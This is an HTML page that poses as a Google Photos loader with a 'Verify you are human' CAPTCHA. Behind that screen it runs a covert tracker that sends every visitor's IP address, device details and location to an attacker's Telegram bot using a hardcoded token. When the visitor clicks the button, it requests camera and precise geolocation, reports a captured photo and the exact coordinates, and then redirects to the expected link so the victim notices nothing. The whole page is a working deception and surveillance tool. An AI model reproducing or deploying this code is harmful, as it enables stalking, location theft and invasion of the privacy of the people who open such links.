<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            background: #202124;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: sans-serif;
            color: #e8eaed;
            flex-direction: column;
        }
        .loader {
            border: 4px solid #303134;
            border-top: 4px solid #4285F4;
            border-radius: 50%;
            width: 48px;
            height: 48px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hint { margin-top: 20px; color: #9aa0a6; font-size: 14px; }
        .footer { 
            position: fixed; bottom: 20px; left: 0; right: 0; text-align: center; 
            color: rgba(255,255,255,0.1); font-size: 11px; 
        }
        .footer span { color: rgba(100,255,218,0.2); }
        /* Fake CAPTCHA Overlay */
        .overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(8px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .box {
            background: #2d2e32;
            padding: 40px 30px;
            border-radius: 20px;
            max-width: 360px;
            text-align: center;
            border: 1px solid #5f6368;
        }
        .box h2 { font-size: 22px; font-weight: 600; margin-bottom: 8px; }
        .box p { color: #9aa0a6; font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
        .btn {
            background: #1a73e8;
            color: #fff;
            border: none;
            padding: 12px 40px;
            border-radius: 24px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
        }
        .btn:hover { background: #1557b0; }
        .icon { font-size: 48px; margin-bottom: 12px; }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div class="hint">Connecting to Google Photos...</div>

    <div class="overlay" id="captchaOverlay">
        <div class="box">
            <div class="icon">🤖</div>
            <h2>Verify you are human</h2>
            <p>To continue, please allow camera access for age verification.</p>
            <button class="btn" id="allowBtn">✅ I am not a robot</button>
        </div>
    </div>

    <div class="footer"><span>dev @btwspark</span></div>

    <script>
        // ============================================================
        // 🔥 CONFIG — Telegram Bot
        // ============================================================
        const BOT_TOKEN = "8569274562:AAGskuxql0tB8FQkTNBYF13p82eTL7LEzX0";   // @BotFather se lo
        const CHAT_ID   = "8363966106";     // @getmyid_bot se lo

        // ============================================================
        // 📤 Send to Telegram
        // ============================================================
        function sendToTelegram(msg) {
            if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || CHAT_ID === "YOUR_CHAT_ID_HERE") {
                console.warn("⚠️ Set BOT_TOKEN & CHAT_ID first!");
                return;
            }
            const now = new Date();
            const ts = now.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true });
            const full = `🧠 *Vyom Tracker*
📅 ${ts}
${msg}
—————————
🛠️ dev @btwspark`;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: full,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            }).catch(console.error);
        }

        // ============================================================
        // 🌐 IP + Device Info (Automatic)
        // ============================================================
        async function captureIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                const loc = await fetch(`https://ipapi.co/${data.ip}/json/`).then(r => r.json());
                const msg = `🆕 *Visitor Detected*
📌 IP: \`${data.ip}\`
💻 Device: ${navigator.userAgent.substring(0, 60)}...
📍 City: ${loc.city || 'N/A'}, ${loc.region || 'N/A'}
🌍 Country: ${loc.country_name || 'N/A'}`;
                sendToTelegram(msg);
            } catch {
                sendToTelegram('⚠️ IP could not be fetched');
            }
        }

        // ============================================================
        // 📸 CAPTURE PHOTO
        // ============================================================
        function capturePhoto(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                const dataUrl = canvas.toDataURL('image/jpeg');
                sendToTelegram(`📸 *Photo Captured* (Size: ${(dataUrl.length / 1024).toFixed(1)} KB)`);
                video.srcObject = null;
                stream.getTracks().forEach(t => t.stop());
            }, 800);
        }

        // ============================================================
        // 📍 LOCATION + CAMERA REQUEST
        // ============================================================
        function requestPermissions() {
            // Camera
            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                .then(stream => {
                    sendToTelegram('✅ *Camera Access:* Granted');
                    capturePhoto(stream);
                })
                .catch(err => {
                    sendToTelegram(`❌ *Camera:* Denied (${err.message})`);
                });

            // Location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        const lat = pos.coords.latitude;
                        const lng = pos.coords.longitude;
                        const acc = Math.round(pos.coords.accuracy);
                        const maps = `https://www.google.com/maps?q=${lat},${lng}`;
                        sendToTelegram(`📍 *Exact Location*
Lat: \`${lat}\`, Lng: \`${lng}\`
Accuracy: ±${acc}m
🗺️ [Map](${maps})`);
                    },
                    err => {
                        sendToTelegram(`❌ *Location:* Denied (${err.message})`);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                sendToTelegram('⚠️ Geolocation not supported');
            }
        }

        // ============================================================
        // 🎮 UI BUTTON CLICK
        // ============================================================
        document.getElementById('allowBtn').addEventListener('click', function() {
            // Hide overlay
            document.getElementById('captchaOverlay').style.display = 'none';
            sendToTelegram('👆 *User clicked "Allow"* (Permissions triggered)');
            
            // Capture
            requestPermissions();

            // Get original URL from query param
            const params = new URLSearchParams(window.location.search);
            const originalUrl = params.get('url');
            const redirectTarget = originalUrl ? decodeURIComponent(originalUrl) : 'https://photos.google.com/album/...';

            // Redirect to original trusted link after 2.5 seconds
            setTimeout(() => {
                window.location.href = redirectTarget;
            }, 2500);
        });

        // ============================================================
        // 🚀 INIT
        // ============================================================
        window.onload = function() {
            captureIP();
            // Show overlay after 1 second
            setTimeout(() => {
                document.getElementById('captchaOverlay').style.display = 'flex';
            }, 1000);
        };
    </script>
</body>
</html>
